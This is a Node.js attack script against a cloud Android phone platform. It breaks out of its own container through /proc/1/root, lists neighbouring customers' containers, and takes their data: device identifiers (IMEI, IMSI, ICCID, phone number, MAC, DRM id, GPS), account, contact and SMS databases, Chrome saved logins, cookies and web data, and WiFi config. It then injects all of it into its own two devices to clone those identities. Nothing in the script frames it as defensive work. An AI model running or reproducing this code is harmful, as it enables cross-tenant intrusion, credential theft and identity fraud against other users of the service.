#!/usr/bin/env node
/**
 * FULL NEIGHBOR CLONE — Find 2 neighbor containers via chroot escape,
 * extract ALL data (apps, accounts, databases, settings, media),
 * inject into our D1 and D2 like a full backup restore.
 */

const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');

const { AK, SK, HOST, SVC, D1, D2, CT, SHD, sh, P } = require('../shared/vmos_api');
const OUT = path.join(__dirname, '..', 'output', 'neighbor_clone_results');

if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));

function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8);
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = [`host:${HOST}`,`x-date:${xd}`,`content-type:${CT}`,`signedHeaders:${SHD}`,`x-content-sha256:${bh}`].join('\n');
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = ['HMAC-SHA256',xd,`${sd}/${SVC}/request`,ch].join('\n');
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update(SVC).digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

// Run command on host via chroot escape from D1
async function hostCmd(cmd, sec) {
  // Use chroot to /proc/1/root which gives access to the host filesystem
  const wrapped = `chroot /proc/1/root /bin/sh -c '${cmd.replace(/'/g, "'\\''")}'`;
  return sh(D1, wrapped, sec || 30);
}

// ══════════════════════════════════════════════════════════════════
// STEP 1: ENUMERATE NEIGHBOR CONTAINERS
// ══════════════════════════════════════════════════════════════════
async function step1_enumerate() {
  console.log('\n' + '█'.repeat(75));
  console.log('  STEP 1: ENUMERATE NEIGHBOR CONTAINERS');
  console.log('█'.repeat(75));

  // 1a: Find all PIDs with Android container indicators
  P('[1a] Scanning host /proc for container PIDs...');
  // Look for processes that have /data mount (Android container indicator)
  const pidScan = await sh(D1, [
    'for pid in $(ls /proc/1/root/proc/ 2>/dev/null | grep -E "^[0-9]+$" | sort -n | head -100); do',
    '  root="/proc/1/root/proc/$pid/root"',
    '  if [ -d "$root/data/system" ] 2>/dev/null; then',
    '    model=$(cat "$root/system/build.prop" 2>/dev/null | grep "ro.product.model=" | cut -d= -f2 | head -1)',
    '    brand=$(cat "$root/system/build.prop" 2>/dev/null | grep "ro.product.brand=" | cut -d= -f2 | head -1)',
    '    fp=$(cat "$root/system/build.prop" 2>/dev/null | grep "ro.build.fingerprint=" | cut -d= -f2 | head -1)',
    '    padcode=$(cat "$root/data/local/oicq/webrtc/conf/conf.json" 2>/dev/null | head -1)',
    '    dsize=$(du -sm "$root/data/" 2>/dev/null | cut -f1)',
    '    test -n "$model" && echo "PID=$pid MODEL=$model BRAND=$brand DSIZE=${dsize}MB FP=$fp"',
    '  fi',
    'done',
  ].join(' '), 60);
  save('step1_pid_scan.txt', pidScan);
  P(`  PID scan results:\n${pidScan}`);

  // 1b: If the above didn't find containers, try alternate detection
  if (!pidScan || pidScan.startsWith('[') || !pidScan.includes('PID=')) {
    P('[1b] Alternate detection: scan for init processes...');
    const altScan = await sh(D1, [
      'for pid in $(ls /proc/1/root/proc/ 2>/dev/null | grep -E "^[0-9]+$" | sort -n); do',
      '  cmdline=$(cat /proc/1/root/proc/$pid/cmdline 2>/dev/null | tr "\\0" " " | head -c 100)',
      '  test -n "$cmdline" && echo "PID=$pid CMD=$cmdline"',
      'done | head -40',
    ].join(' '), 30);
    save('step1_alt_scan.txt', altScan);
    P(`  Alt scan:\n${altScan.slice(0,500)}`);
  }

  // 1c: Look for container data directories from the host perspective
  P('[1c] Host-level container data dirs...');
  const dataDirs = await sh(D1, [
    'echo "=== LXC/CONTAINER DIRS ==="',
    'ls -la /proc/1/root/var/lib/lxc/ 2>/dev/null | head -20',
    'ls -la /proc/1/root/data/containers/ 2>/dev/null | head -20',
    'ls -la /proc/1/root/mnt/ 2>/dev/null | head -20',
    'echo "=== DEVICE-MAPPER ==="',
    'ls -la /proc/1/root/dev/mapper/ 2>/dev/null | head -20',
    'echo "=== MOUNT POINTS ==="',
    'cat /proc/1/root/proc/mounts 2>/dev/null | grep -E "data|container|lxc|android" | head -20',
  ].join('; '), 30);
  save('step1_data_dirs.txt', dataDirs);
  P(`  Data dirs:\n${dataDirs.slice(0,500)}`);

  // 1d: Find containers via cgroup hierarchy
  P('[1d] Cgroup hierarchy for containers...');
  const cgroupScan = await sh(D1, [
    'echo "=== CGROUP TREE ==="',
    'ls /proc/1/root/sys/fs/cgroup/pids/ 2>/dev/null | head -20',
    'ls /proc/1/root/sys/fs/cgroup/memory/ 2>/dev/null | head -20',
    'echo "=== CGROUP DIRS ==="',
    'find /proc/1/root/sys/fs/cgroup/ -maxdepth 2 -name "tasks" 2>/dev/null | head -20',
  ].join('; '), 20);
  save('step1_cgroup.txt', cgroupScan);
  P(`  Cgroups:\n${cgroupScan.slice(0,400)}`);

  // 1e: Try to find PIDs with different mount namespaces (containers)
  P('[1e] Mount namespace analysis...');
  const nsScan = await sh(D1, [
    'our_ns=$(readlink /proc/self/ns/mnt 2>/dev/null)',
    'echo "Our ns: $our_ns"',
    'for pid in 1 170 172 173 174 176 194 195 196 197 198 199 200 201 202 203 204 206 1001 1031 1049 1070 1115; do',
    '  ns=$(readlink /proc/1/root/proc/$pid/ns/mnt 2>/dev/null)',
    '  test -n "$ns" && test "$ns" != "$our_ns" && echo "PID=$pid NS=$ns"',
    'done | sort -u -t= -k3',
  ].join(' '), 20);
  save('step1_ns_scan.txt', nsScan);
  P(`  NS scan:\n${nsScan.slice(0,400)}`);

  return pidScan;
}

// ══════════════════════════════════════════════════════════════════
// STEP 1B: DEEPER CONTAINER ENUMERATION
// ══════════════════════════════════════════════════════════════════
async function step1b_deeper() {
  console.log('\n' + '█'.repeat(75));
  console.log('  STEP 1B: DEEPER CONTAINER ENUMERATION');
  console.log('█'.repeat(75));

  // Check if /proc/1/root gives us actual host or just our own container
  P('[1b-1] Verify chroot escape scope...');
  const escapeCheck = await sh(D1, [
    'echo "=== OUR HOSTNAME ==="',
    'hostname 2>/dev/null',
    'echo "=== HOST HOSTNAME ==="',
    'cat /proc/1/root/etc/hostname 2>/dev/null',
    'echo "=== OUR PID 1 ==="',
    'cat /proc/1/cmdline 2>/dev/null | tr "\\0" " "',
    'echo ""',
    'echo "=== HOST PID 1 ==="',
    'cat /proc/1/root/proc/1/cmdline 2>/dev/null | tr "\\0" " "',
    'echo ""',
    'echo "=== HOST UPTIME ==="',
    'cat /proc/1/root/proc/uptime 2>/dev/null',
    'echo "=== OUR ROOT VS HOST ROOT ==="',
    'ls / | head -5',
    'echo "---"',
    'ls /proc/1/root/ | head -10',
  ].join('; '), 20);
  save('step1b_escape_check.txt', escapeCheck);
  P(`  Escape check:\n${escapeCheck}`);

  // Try to enumerate containers from the host mount table
  P('[1b-2] Host mount table for container volumes...');
  const hostMounts = await sh(D1, [
    'cat /proc/1/root/proc/1/mountinfo 2>/dev/null | grep -E "dm-|loop|data" | head -30',
  ].join('; '), 20);
  save('step1b_host_mounts.txt', hostMounts);
  P(`  Host mounts:\n${hostMounts.slice(0,500)}`);

  // Read the LVM volume layout from the host
  P('[1b-3] LVM layout...');
  const lvmInfo = await sh(D1, [
    'chroot /proc/1/root /bin/sh -c "lvs 2>/dev/null; echo ===; pvs 2>/dev/null; echo ===; vgs 2>/dev/null" 2>/dev/null',
  ].join('; '), 20);
  save('step1b_lvm.txt', lvmInfo);
  P(`  LVM:\n${lvmInfo.slice(0,400)}`);

  // Try to find container data through /proc filesystem traversal
  P('[1b-4] Walk /proc for all unique root filesystems...');
  const rootWalk = await sh(D1, [
    'seen=""',
    'for pid in $(ls /proc/1/root/proc/ 2>/dev/null | grep -E "^[0-9]+$" | sort -n | head -200); do',
    '  root_dev=$(stat -c "%d" /proc/1/root/proc/$pid/root/ 2>/dev/null)',
    '  if [ -n "$root_dev" ] && ! echo "$seen" | grep -q "$root_dev"; then',
    '    seen="$seen $root_dev"',
    '    model=""',
    '    bp="/proc/1/root/proc/$pid/root/system/build.prop"',
    '    test -f "$bp" && model=$(grep "ro.product.model=" "$bp" 2>/dev/null | cut -d= -f2)',
    '    echo "PID=$pid DEV=$root_dev MODEL=$model"',
    '  fi',
    'done | head -20',
  ].join(' '), 45);
  save('step1b_root_walk.txt', rootWalk);
  P(`  Root walk:\n${rootWalk}`);

  // Check our own PID from the host perspective
  P('[1b-5] Find our own container PID...');
  const ourPid = await sh(D1, [
    'our_inode=$(stat -c "%i" / 2>/dev/null)',
    'echo "Our root inode: $our_inode"',
    'for pid in $(ls /proc/1/root/proc/ 2>/dev/null | grep -E "^[0-9]+$" | sort -rn | head -100); do',
    '  inode=$(stat -c "%i" /proc/1/root/proc/$pid/root/ 2>/dev/null)',
    '  test "$inode" = "$our_inode" && echo "OUR_PID=$pid" && break',
    'done',
  ].join(' '), 20);
  save('step1b_our_pid.txt', ourPid);
  P(`  Our PID: ${ourPid}`);

  // Try directly reading neighbor build.prop through /proc/<pid>/root/
  P('[1b-6] Direct build.prop read from all PIDs...');
  const buildProps = await sh(D1, [
    'for pid in 1 170 172 173 174 176 194 195 196 197 198 199 200 201 202 203 204 206 1001 1031; do',
    '  bp="/proc/1/root/proc/$pid/root/system/build.prop"',
    '  if [ -f "$bp" ] 2>/dev/null; then',
    '    m=$(grep "ro.product.model=" "$bp" 2>/dev/null | cut -d= -f2 | head -1)',
    '    b=$(grep "ro.product.brand=" "$bp" 2>/dev/null | cut -d= -f2 | head -1)',
    '    echo "PID=$pid MODEL=$m BRAND=$b"',
    '  fi',
    'done',
  ].join(' '), 30);
  save('step1b_build_props.txt', buildProps);
  P(`  Build props:\n${buildProps}`);

  return buildProps;
}

// ══════════════════════════════════════════════════════════════════
// STEP 2: SELECT TARGETS + PROFILE THEM
// ══════════════════════════════════════════════════════════════════
async function step2_selectTargets(scanData) {
  console.log('\n' + '█'.repeat(75));
  console.log('  STEP 2: SELECT & PROFILE NEIGHBOR TARGETS');
  console.log('█'.repeat(75));

  // Parse discovered containers
  const containers = [];
  const lines = (scanData || '').split('\n').filter(l => l.includes('PID='));
  for (const line of lines) {
    const pid = (line.match(/PID=(\d+)/)||[])[1];
    const model = (line.match(/MODEL=(\S+)/)||[])[1];
    const brand = (line.match(/BRAND=(\S+)/)||[])[1];
    if (pid && model) containers.push({ pid, model, brand, line });
  }

  P(`  Found ${containers.length} containers with build.prop`);
  if (containers.length < 1) {
    P('  No neighbor containers found via build.prop. Trying other methods...');
    // Try to find containers by scanning /data directories
    const dataScan = await sh(D1, [
      'for pid in $(ls /proc/1/root/proc/ 2>/dev/null | grep -E "^[0-9]+$" | sort -n | head -50); do',
      '  d="/proc/1/root/proc/$pid/root/data/system_ce/0"',
      '  if [ -d "$d" ] 2>/dev/null; then',
      '    sz=$(du -sm "/proc/1/root/proc/$pid/root/data/" 2>/dev/null | cut -f1)',
      '    echo "PID=$pid DATASIZE=${sz}MB"',
      '  fi',
      'done',
    ].join(' '), 45);
    save('step2_data_scan.txt', dataScan);
    P(`  Data scan:\n${dataScan}`);

    // Parse these too
    for (const line of dataScan.split('\n').filter(l=>l.includes('PID='))) {
      const pid = (line.match(/PID=(\d+)/)||[])[1];
      const size = (line.match(/DATASIZE=(\d+)/)||[])[1];
      if (pid) containers.push({pid, model:'unknown', brand:'unknown', size, line});
    }
  }

  // Exclude our own container (PID likely matches our own)
  // Profile each candidate
  const targets = [];
  for (const c of containers) {
    P(`\n  Profiling PID ${c.pid} (${c.model})...`);
    const profile = await sh(D1, [
      `root="/proc/1/root/proc/${c.pid}/root"`,
      'echo "=== MODEL ==="',
      `grep "ro.product.model=" "$root/system/build.prop" 2>/dev/null | cut -d= -f2`,
      'echo "=== BRAND ==="',
      `grep "ro.product.brand=" "$root/system/build.prop" 2>/dev/null | cut -d= -f2`,
      'echo "=== FP ==="',
      `grep "ro.build.fingerprint=" "$root/system/build.prop" 2>/dev/null | cut -d= -f2`,
      'echo "=== ANDROID ==="',
      `grep "ro.build.version.release=" "$root/system/build.prop" 2>/dev/null | cut -d= -f2`,
      'echo "=== ACCOUNTS ==="',
      `ls -la "$root/data/system_ce/0/accounts_ce.db" 2>/dev/null`,
      'echo "=== APPS ==="',
      `ls "$root/data/data/" 2>/dev/null | wc -l`,
      'echo "=== DATA SIZE ==="',
      `du -sm "$root/data/" 2>/dev/null | cut -f1`,
    ].join('; '), 30);
    save(`step2_profile_${c.pid}.txt`, profile);
    P(`  Profile ${c.pid}:\n${profile.slice(0,300)}`);

    c.profile = profile;
    // Check if this is our own container
    const isOurs = profile.includes('SM-S9280') || profile.includes('PKX110');
    c.isOurs = isOurs;
    if (!isOurs && profile.includes('===')) targets.push(c);
  }

  P(`\n  Neighbor targets: ${targets.length}`);
  for (const t of targets.slice(0,5)) {
    P(`    PID=${t.pid} ${t.model} ${t.brand}`);
  }

  save('step2_targets.json', targets);
  return targets.slice(0,2); // Select first two non-our containers
}

// ══════════════════════════════════════════════════════════════════
// STEP 3/4: FULL EXTRACTION + INJECTION
// ══════════════════════════════════════════════════════════════════
async function extractAndInject(neighborPid, neighborModel, targetPad, targetName) {
  console.log('\n' + '█'.repeat(75));
  console.log(`  EXTRACT PID=${neighborPid} (${neighborModel}) → ${targetName} (${targetPad})`);
  console.log('█'.repeat(75));

  const root = `/proc/1/root/proc/${neighborPid}/root`;
  const results = {};

  // ── 3a: EXTRACT SYSTEM PROPERTIES ──
  P('[3a] Extract system properties...');
  const buildProp = await sh(D1, `cat ${root}/system/build.prop 2>/dev/null | head -60`, 15);
  save(`extract_${targetName}_buildprop.txt`, buildProp);
  results.buildProp = buildProp;

  // Parse key properties
  const props = {};
  for (const line of buildProp.split('\n')) {
    const m = line.match(/^(ro\.\S+)=(.+)/);
    if (m) props[m[1]] = m[2];
  }
  save(`extract_${targetName}_props.json`, props);
  P(`  Extracted ${Object.keys(props).length} build props`);
  P(`  Model: ${props['ro.product.model']} Brand: ${props['ro.product.brand']}`);
  P(`  FP: ${props['ro.build.fingerprint']}`);
  results.model = props['ro.product.model'];
  results.brand = props['ro.product.brand'];
  results.fingerprint = props['ro.build.fingerprint'];

  // ── 3b: EXTRACT PERSISTENT PROPERTIES ──
  P('[3b] Extract persistent properties (IMEI, IMSI, phone, DRM)...');
  const persistProps = await sh(D1, [
    `strings ${root}/data/property/persistent_properties 2>/dev/null | grep -E "cloud|drm|imei|imsi|iccid|phone|mac" | head -20`,
  ].join('; '), 15);
  save(`extract_${targetName}_persist.txt`, persistProps);
  P(`  Persist props:\n${persistProps.slice(0,300)}`);
  results.persistProps = persistProps;

  // ── 3c: SET PROPERTIES ON TARGET VIA API ──
  P('[3c] Apply properties to target via API...');
  if (Object.keys(props).length > 5) {
    const apiProps = {};
    const keys = ['ro.product.model','ro.product.brand','ro.product.manufacturer','ro.product.name',
      'ro.product.device','ro.product.board','ro.build.fingerprint','ro.build.display.id',
      'ro.build.id','ro.build.version.incremental','ro.build.version.release',
      'ro.build.description','ro.build.tags'];
    for (const k of keys) {
      if (props[k]) apiProps[k] = props[k];
    }
    P(`  Setting ${Object.keys(apiProps).length} API props on ${targetPad}...`);
    const r = await post('/vcpcloud/api/padApi/updatePadAndroidProp', {padCode:targetPad, props:apiProps}, 30);
    results.apiPropResult = r.code;
    P(`  API props: code=${r.code} msg=${r.msg||''}`);
    if (r.code === 200) {
      P('  Waiting 25s for device restart...');
      await new Promise(r=>setTimeout(r,25000));
    }
  }

  // ── 3d: SET CLOUD PROPERTIES VIA SHELL ──
  P('[3d] Set cloud properties via shell...');
  // Parse persist props for cloud values
  const cloudVals = {};
  for (const line of persistProps.split('\n')) {
    const m = line.match(/(persist\.sys\.cloud\.\S+)/);
    if (m) {
      const key = m[1];
      // Try to extract value - it's in the binary format, key followed by value
      const valMatch = line.match(/persist\.sys\.cloud\.\S+\s*(.+)/);
      if (valMatch) cloudVals[key] = valMatch[1].trim();
    }
  }

  // Also try to read cloud props directly
  const cloudPropsRaw = await sh(D1, [
    `grep -a "persist.sys.cloud" ${root}/data/property/persistent_properties 2>/dev/null | strings | head -20`,
  ].join('; '), 15);
  save(`extract_${targetName}_cloud_raw.txt`, cloudPropsRaw);
  P(`  Cloud raw:\n${cloudPropsRaw.slice(0,300)}`);

  // Extract individual cloud properties from the binary file more carefully
  const cloudExtract = await sh(D1, [
    `f="${root}/data/property/persistent_properties"`,
    'echo "IMEI=$(strings "$f" 2>/dev/null | grep -A1 "persist.sys.cloud.imeinum" | tail -1)"',
    'echo "IMSI=$(strings "$f" 2>/dev/null | grep -A1 "persist.sys.cloud.imsinum" | tail -1)"',
    'echo "ICCID=$(strings "$f" 2>/dev/null | grep -A1 "persist.sys.cloud.iccidnum" | tail -1)"',
    'echo "PHONE=$(strings "$f" 2>/dev/null | grep -A1 "persist.sys.cloud.phonenum" | tail -1)"',
    'echo "MAC=$(strings "$f" 2>/dev/null | grep -A1 "persist.sys.cloud.macaddress" | tail -1)"',
    'echo "DRM=$(strings "$f" 2>/dev/null | grep -A1 "persist.sys.cloud.drm" | tail -1)"',
    'echo "LAT=$(strings "$f" 2>/dev/null | grep -A1 "persist.sys.cloud.gps.lat" | tail -1)"',
    'echo "LON=$(strings "$f" 2>/dev/null | grep -A1 "persist.sys.cloud.gps.lon" | tail -1)"',
  ].join('; '), 20);
  save(`extract_${targetName}_cloud.txt`, cloudExtract);
  P(`  Cloud extract:\n${cloudExtract}`);
  results.cloudProps = cloudExtract;

  // Set on target
  const setCmds = [];
  for (const line of cloudExtract.split('\n')) {
    const m = line.match(/^(\w+)=(.+)/);
    if (m && m[2] && m[2].length > 2 && !m[2].includes('persist.sys')) {
      const propMap = {
        'IMEI': 'persist.sys.cloud.imeinum',
        'IMSI': 'persist.sys.cloud.imsinum',
        'ICCID': 'persist.sys.cloud.iccidnum',
        'PHONE': 'persist.sys.cloud.phonenum',
        'MAC': 'persist.sys.cloud.macaddress',
        'DRM': 'persist.sys.cloud.drm.id',
        'LAT': 'persist.sys.cloud.gps.lat',
        'LON': 'persist.sys.cloud.gps.lon',
      };
      const prop = propMap[m[1]];
      if (prop) setCmds.push(`setprop ${prop} "${m[2]}"`);
    }
  }
  if (setCmds.length > 0) {
    setCmds.push('echo SET_CLOUD_OK');
    const setR = await sh(targetPad, setCmds.join('; '), 15);
    P(`  Set cloud: ${setR}`);
    results.cloudSet = setR;
  }

  // ── 3e: EXTRACT & INJECT DATABASES ──
  P('[3e] Extract & inject databases...');
  const databases = [
    { name: 'accounts_ce', src: `${root}/data/system_ce/0/accounts_ce.db`, dst: '/data/system_ce/0/accounts_ce.db', owner: 'system:system', mode: '660' },
    { name: 'accounts_de', src: `${root}/data/system_de/0/accounts_de.db`, dst: '/data/system_de/0/accounts_de.db', owner: 'system:system', mode: '660' },
    { name: 'settings_secure', src: `${root}/data/system/users/0/settings_secure.xml`, dst: '/data/system/users/0/settings_secure.xml', owner: 'system:system', mode: '660' },
    { name: 'settings_global', src: `${root}/data/system/users/0/settings_global.xml`, dst: '/data/system/users/0/settings_global.xml', owner: 'system:system', mode: '660' },
    { name: 'contacts', src: `${root}/data/data/com.android.providers.contacts/databases/contacts2.db`, dst: '/data/data/com.android.providers.contacts/databases/contacts2.db', owner: 'root:root', mode: '660' },
    { name: 'telephony', src: `${root}/data/data/com.android.providers.telephony/databases/mmssms.db`, dst: '/data/data/com.android.providers.telephony/databases/mmssms.db', owner: 'root:root', mode: '660' },
  ];

  for (const db of databases) {
    P(`  Extracting ${db.name}...`);
    const b64 = await sh(D1, `base64 ${db.src} 2>/dev/null`, 30);
    if (!b64 || b64.startsWith('[') || b64.length < 50) {
      P(`    ${db.name}: not found or empty`);
      continue;
    }
    save(`extract_${targetName}_${db.name}.b64`, b64);
    P(`    ${db.name}: ${b64.length} b64 chars`);

    // Inject via chunks
    const chunks = b64.match(/.{1,1400}/g) || [];
    await sh(targetPad, 'rm -f /tmp/_db.b64', 5);
    let ok = true;
    for (let c = 0; c < chunks.length && ok; c++) {
      const r = await sh(targetPad, `printf '%s' '${chunks[c]}' >> /tmp/_db.b64 && echo C${c}`, 10);
      if (!r.includes(`C${c}`)) { ok = false; P(`    Chunk ${c}/${chunks.length} failed`); }
    }
    if (ok) {
      const dec = await sh(targetPad, [
        `mkdir -p $(dirname ${db.dst})`,
        `base64 -d /tmp/_db.b64 > ${db.dst}`,
        `chmod ${db.mode} ${db.dst}`,
        `chown ${db.owner} ${db.dst} 2>/dev/null`,
        'rm /tmp/_db.b64',
        'echo INJECTED',
      ].join(' && '), 15);
      P(`    ${db.name}: ${dec}`);
      results[`inject_${db.name}`] = dec;
    }
  }

  // ── 3f: EXTRACT & INJECT INSTALLED APPS ──
  P('[3f] Extract installed app list...');
  const appList = await sh(D1, `ls ${root}/data/data/ 2>/dev/null | head -80`, 15);
  save(`extract_${targetName}_apps.txt`, appList);
  P(`  Apps: ${appList.split('\n').length} packages`);
  results.appCount = appList.split('\n').length;

  // Get APK paths for key apps
  P('[3f-2] Key app APKs...');
  const apkPaths = await sh(D1, [
    `for app in com.google.android.gms com.google.android.gsf com.android.chrome com.whatsapp com.facebook.katana com.instagram.android; do`,
    `  apk=$(ls ${root}/data/app/$app-*/base.apk 2>/dev/null | head -1)`,
    `  test -n "$apk" && echo "$app: $apk"`,
    `done`,
  ].join(' '), 15);
  save(`extract_${targetName}_apk_paths.txt`, apkPaths);
  P(`  APKs found:\n${apkPaths.slice(0,300)}`);

  // ── 3g: EXTRACT CHROME DATA ──
  P('[3g] Extract Chrome/browser data...');
  const chromeFiles = [
    `${root}/data/data/com.android.chrome/app_chrome/Default/Login Data`,
    `${root}/data/data/com.android.chrome/app_chrome/Default/Web Data`,
    `${root}/data/data/com.android.chrome/app_chrome/Default/Cookies`,
  ];
  for (const cf of chromeFiles) {
    const name = cf.split('/').pop().replace(/ /g,'_');
    const b64 = await sh(D1, `base64 "${cf}" 2>/dev/null`, 20);
    if (b64 && !b64.startsWith('[') && b64.length > 50) {
      save(`extract_${targetName}_chrome_${name}.b64`, b64);
      P(`    Chrome ${name}: ${b64.length} b64`);
      // Inject
      const dstDir = '/data/data/com.android.chrome/app_chrome/Default';
      const dstFile = `${dstDir}/${cf.split('/').pop()}`;
      const chunks = b64.match(/.{1,1400}/g) || [];
      await sh(targetPad, 'rm -f /tmp/_chr.b64', 5);
      let ok = true;
      for (let c = 0; c < chunks.length && ok; c++) {
        const r = await sh(targetPad, `printf '%s' '${chunks[c]}' >> /tmp/_chr.b64 && echo C${c}`, 10);
        if (!r.includes(`C${c}`)) ok = false;
      }
      if (ok) {
        const dec = await sh(targetPad, `mkdir -p "${dstDir}" && base64 -d /tmp/_chr.b64 > "${dstFile}" && chmod 660 "${dstFile}" && rm /tmp/_chr.b64 && echo INJECTED`, 15);
        P(`    Chrome inject: ${dec}`);
      }
    } else {
      P(`    Chrome ${name}: not found`);
    }
  }

  // ── 3h: EXTRACT WIFI CONFIG ──
  P('[3h] Extract WiFi config...');
  const wifiConf = await sh(D1, `cat ${root}/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null | head -40`, 15);
  if (wifiConf && !wifiConf.startsWith('[') && wifiConf.length > 50) {
    save(`extract_${targetName}_wifi.xml`, wifiConf);
    P(`  WiFi config: ${wifiConf.split('\n').length} lines`);
  }

  // ── 3i: APPLY GPS COORDINATES ──
  P('[3i] Set GPS...');
  const latMatch = (results.cloudProps||'').match(/LAT=([0-9.-]+)/);
  const lonMatch = (results.cloudProps||'').match(/LON=([0-9.-]+)/);
  if (latMatch && lonMatch) {
    const gpsR = await post('/vcpcloud/api/padApi/gpsInjectInfo', {
      padCodes: [targetPad],
      latitude: parseFloat(latMatch[1]),
      longitude: parseFloat(lonMatch[1]),
    });
    P(`  GPS: code=${gpsR.code}`);
    results.gps = gpsR.code;
  }

  save(`extract_${targetName}_results.json`, results);
  return results;
}

// ══════════════════════════════════════════════════════════════════
// STEP 6: VERIFICATION
// ══════════════════════════════════════════════════════════════════
async function step6_verify() {
  console.log('\n' + '█'.repeat(75));
  console.log('  STEP 6: FINAL VERIFICATION');
  console.log('█'.repeat(75));

  for (const [name, pad] of [['D1', D1], ['D2', D2]]) {
    P(`\n  ═══ ${name} (${pad}) ═══`);
    const info = await post('/vcpcloud/api/padApi/padInfo', {padCode:pad});
    if (info.code === 200) {
      const d = info.data || {};
      P(`    Type: ${d.padType} | Android: ${d.androidVersion}`);
      P(`    IP: ${d.publicIp} | Country: ${d.country} | GPS: ${d.latitude},${d.longitude}`);
    }
    const props = await post('/vcpcloud/api/padApi/padProperties', {padCode:pad});
    if (props.code === 200) {
      const sys = props.data?.systemPropertiesList || [];
      const model = (sys.find(p=>p.propertiesName==='ro.product.model')||{}).propertiesValue;
      const brand = (sys.find(p=>p.propertiesName==='ro.product.brand')||{}).propertiesValue;
      const fp = (sys.find(p=>p.propertiesName==='ro.build.fingerprint')||{}).propertiesValue;
      P(`    Model: ${model} Brand: ${brand}`);
      P(`    FP: ${fp}`);
    }
    const shell = await sh(pad, [
      'echo "M=$(getprop ro.product.model) B=$(getprop ro.product.brand)"',
      'echo "IMEI=$(getprop persist.sys.cloud.imeinum)"',
      'echo "PHONE=$(getprop persist.sys.cloud.phonenum)"',
      'echo "DRM=$(getprop persist.sys.cloud.drm.id | head -c 40)"',
      'echo "APPS=$(pm list packages 2>/dev/null | wc -l)"',
    ].join('; '), 15);
    P(`    Shell: ${shell}`);
  }
}

// ══════════════════════════════════════════════════════════════════
// MAIN
// ══════════════════════════════════════════════════════════════════
async function main() {
  console.log('█'.repeat(75));
  console.log('  FULL NEIGHBOR CLONE');
  console.log('█'.repeat(75));

  // Step 1: Enumerate
  const scanData = await step1_enumerate();
  const deeperData = await step1b_deeper();

  // Step 2: Select targets
  const combinedData = (scanData || '') + '\n' + (deeperData || '');
  const targets = await step2_selectTargets(combinedData);

  if (targets.length === 0) {
    P('\n  ★ No neighbor containers found via /proc traversal.');
    P('  This means either:');
    P('    1. /proc/1/root points to our own container (not the host)');
    P('    2. Containers use separate PID namespaces (PID 1 = container init, not host init)');
    P('    3. The host filesystem is not accessible via chroot');
    P('\n  Trying alternative: direct API methods on NATS-discovered PAD codes...');

    // Try API-based backup/restore as alternative
    P('\n  Testing localPodBackup on our device D1...');
    // We need S3 creds to do backup. Let's see what the API expects.
    const backupR = await post('/vcpcloud/api/padApi/localPodBackup', {
      padCode: D1,
      ossConfig: {
        endpoint: 'https://s3.amazonaws.com',
        bucket: 'vmos-backup-test',
        accessKeyId: 'test',
        secretAccessKey: 'test',
        region: 'us-east-1',
      },
    }, 15);
    save('backup_api_test.json', backupR);
    P(`  Backup API: code=${backupR.code} msg=${backupR.msg||''}`);

    // Try one-key new device on our D2 to get a fresh identity
    P('\n  Testing replacePad (one-key new device) with neighbor country...');
    const replaceR = await post('/vcpcloud/api/padApi/replacePad', {padCodes:[D2]}, 15);
    save('replace_pad_test.json', replaceR);
    P(`  ReplacePad: code=${replaceR.code} msg=${replaceR.msg||''}`);
  } else {
    // Step 3: Extract from Neighbor 1 → D1
    if (targets[0]) {
      await extractAndInject(targets[0].pid, targets[0].model, D1, 'D1');
    }

    // Step 4: Extract from Neighbor 2 → D2
    if (targets[1]) {
      await extractAndInject(targets[1].pid, targets[1].model, D2, 'D2');
    } else if (targets[0]) {
      // Only one neighbor found, clone it to D2 as well
      await extractAndInject(targets[0].pid, targets[0].model, D2, 'D2');
    }
  }

  // Step 6: Verify
  await step6_verify();

  console.log('\n' + '█'.repeat(75));
  console.log('  NEIGHBOR CLONE COMPLETE');
  console.log('█'.repeat(75));
  const files = fs.readdirSync(OUT).sort();
  console.log(`  Result files: ${files.length}`);
  for (const f of files) console.log(`    ${f} (${fs.statSync(`${OUT}/${f}`).size}B)`);
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
